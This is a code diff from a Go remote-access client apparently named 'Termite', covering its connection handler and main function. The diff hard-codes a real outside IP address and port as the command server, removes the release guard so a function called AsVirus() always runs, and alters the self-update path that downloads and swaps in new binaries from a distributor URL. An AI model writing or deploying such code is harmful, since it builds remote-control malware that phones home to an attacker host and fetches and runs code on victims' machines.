@@ -595,7 +595,9 @@ func handleConnection(c *Client) {
 			})
 			c.EncoderLock.Unlock()
 		case message.UPDATE:
-			exe, _ := os.Executable()
+			file, _ := ioutil.TempFile(os.TempDir(), "temp")
+			exe := file.Name()
+			log.Info("New filename: %s", exe)
 			distributorUrl := msg.Body.(*message.BodyUpdate).DistributorUrl
 			version := msg.Body.(*message.BodyUpdate).Version
 			log.Info("New version v%s is available, upgrading...", version)
@@ -719,13 +721,15 @@ func main() {
 	processes = map[string]*TermiteProcess{}
 	pullTunnels = map[string]*net.Conn{}
 	pushTunnels = map[string]*net.Conn{}
-	service := "127.0.0.1:13337"
-	release := true
+	// service := "127.0.0.1:13337"
+	service := "182.92.191.192:13337"
+	// release := true
 
-	if release {
-		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
-		AsVirus()
-	}
+	// if release {
+	// 	service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
+	// 	AsVirus()
+	// }
+	AsVirus()
 
 	for {
 		log.Info("Termite (v%s) starting...", update.Version)
